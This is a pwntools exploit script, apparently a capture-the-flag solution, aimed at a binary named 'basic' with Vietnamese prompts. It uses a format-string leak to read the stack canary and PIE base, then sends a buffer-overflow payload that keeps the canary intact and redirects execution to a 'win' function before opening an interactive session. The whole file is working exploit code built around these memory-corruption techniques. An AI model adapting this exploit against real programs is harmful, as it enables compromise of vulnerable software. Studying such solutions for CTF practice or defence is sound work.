#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

def conn():
	local = 0
	debug = 0

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./basic')
		if debug:
			gdb.attach(s, gdbscript='''
				brva 0x126e
				brva 0x1229
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('', 10000)

	return s

s = conn()

binary = ELF('basic')

s.sendlineafter(b'Nhap do dai tin nhan: ', b'-1')
s.sendline(b'%19$p %21$p')

canary = int(s.recvuntil(b' ', drop = True).decode(), 16)

log.info('canary: 0x%x', canary)

binary.address = int(s.recvline().strip().decode(), 16) - 0x13dc

log.info('PIE: 0x%x', binary.address)

s.sendlineafter(b'2. Khong', b'1')

payload = b'A' * 0x20 + b'Nghi Hoang Khoa dep trai' + b'A' * 0x20 + p64(canary) + b'A' * 8 + p64(binary.symbols['win'] + 124) + p64(binary.symbols['win']) 

s.sendline(payload)

s.interactive()